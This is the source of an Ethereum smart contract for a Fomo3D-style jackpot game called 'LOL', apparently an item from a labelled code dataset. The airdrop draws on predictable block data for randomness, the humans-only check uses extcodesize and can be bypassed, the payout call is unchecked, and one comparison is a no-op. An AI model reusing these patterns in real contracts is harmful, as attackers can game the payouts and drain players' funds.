0<CODESPLIT>contract LOLevents {              event onNewName    (        uint256 indexed playerID,                    address indexed playerAddress,               bytes32 indexed playerName,                  bool isNewPlayer,                            uint256 affiliateID,                         address affiliateAddress,                    bytes32 affiliateName,                       uint256 amountPaid,                          uint256 timeStamp                        );             event onEndTx    (        uint256 compressedData,             uint256 compressedIDs,              bytes32 playerName,        address playerAddress,        uint256 ethIn,        uint256 keysBought,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount,        uint256 potAmount,        uint256 airDropPot    );    	     event onWithdraw    (        uint256 indexed playerID,        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 timeStamp    );             event onWithdrawAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );                  event onBuyAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethIn,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );                  event onReLoadAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );             event onAffiliatePayout    (        uint256 indexed affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 indexed roundID,        uint256 indexed buyerID,        uint256 amount,        uint256 timeStamp    );             event onPotSwapDeposit    (        uint256 roundID,        uint256 amountAddedToPot    );}    
0<CODESPLIT>contract LOLlong is modularLong,Owned {    using SafeMath for *;                        using NameFilter for string;                 using LOLKeysCalcLong for uint256;		                                     LOLOfficalBankInterface constant private lol_offical_bank = LOLOfficalBankInterface(0xF66E2D098D85b803D5ae710008fCc876c8656fFd);       	LOLPlayerBookInterface constant private PlayerBook = LOLPlayerBookInterface(0x3bede1c8601baF37220a5E2dA41409481132EC51);                       string constant public name = "LOL Official";    string constant public symbol = "LOL";	uint256 private rndExtra_ = 0 hours;     uint256 private rndGap_ = 0 hours;     uint256 constant private rndInit_ = 1 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     	uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => LOLdatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => LOLdatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => LOLdatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => LOLdatasets.TeamFee) public fees_;               mapping (uint256 => LOLdatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = LOLdatasets.TeamFee(36,0);            fees_[1] = LOLdatasets.TeamFee(43,0);            fees_[2] = LOLdatasets.TeamFee(66,0);           fees_[3] = LOLdatasets.TeamFee(51,0);                                      potSplit_[0] = LOLdatasets.PotSplit(25,0);           potSplit_[1] = LOLdatasets.PotSplit(25,0);            potSplit_[2] = LOLdatasets.PotSplit(40,0);           potSplit_[3] = LOLdatasets.PotSplit(40,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");         _;    }             modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;        }                 function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                             uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affCode, _team, _eventData_);    }        function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }        function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 LOLdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 LOLdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 LOLdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         LOLdatasets.EventReturns memory _eventData_;                         			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit LOLevents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit LOLevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit LOLevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit LOLevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit LOLevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                   uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                         if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                         } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)             {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                                 emit LOLevents.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.P3DAmount,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, LOLdatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                     core(_rID, _pID, _eth, _affID, _team, _eventData_);                         } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                         emit LOLevents.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );        }    }             function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (_eth > 1000000000)         {                                     uint256 _keys = (round_[_rID].eth).keysRec(_eth);                                     if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;              if (round_[_rID].team != _team)                round_[_rID].team = _team;                                      _eventData_.compressedData = _eventData_.compressedData + 100;        }                                     if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                 airDropTracker_ = 0;            }        }                             _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                                     plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                                     round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                                          _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                         		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }             function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                    function determinePID(LOLdatasets.EventReturns memory _eventData_)        private        returns (LOLdatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }             function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }             function managePlayer(uint256 _pID, LOLdatasets.EventReturns memory _eventData_)        private        returns (LOLdatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                             plyr_[_pID].lrnd = rID_;                             _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(LOLdatasets.EventReturns memory _eventData_)        private        returns (LOLdatasets.EventReturns)    {                 uint256 _rID = rID_;                         uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                         uint256 _pot = round_[_rID].pot;                                  uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                         plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                         if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))        {                                                                                          _p3d = _p3d.add(_com);            _com = 0;        }                         round_[_rID].mask = _ppt.add(round_[_rID].mask);                                     _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = 0;        _eventData_.newPot = _res;                         rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;                return(_eventData_);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                         uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                         if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_)        private        returns(LOLdatasets.EventReturns)    {                 uint256 _com = _eth / 50;        uint256 _p3d;                                             uint256 _aff = _eth / 10;                                  if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _com = _com.add(_aff);        }        address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));                                                                                                                                     return(_eventData_);    }             function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, LOLdatasets.EventReturns memory _eventData_)        private        returns(LOLdatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth / 50);        airDropPot_ = airDropPot_.add(_air);                         _eth = _eth.sub(((_eth.mul(14)) / 100));                         uint256 _pot = _eth.sub(_gen);                                  uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                         return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, LOLdatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);                emit LOLevents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(            msg.sender == owner,            "only team just can activate"        );                         require(activated_ == false, "fomo3d already activated");                         activated_ = true;                 		rID_ = 1;        round_[1].strt = now + rndExtra_ - rndGap_;        round_[1].end = now + rndInit_ + rndExtra_;    }}    library LOLdatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library LOLKeysCalcLong {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface LOLOfficalBankInterface {    function deposit() external payable returns(bool);}interface LOLPlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} 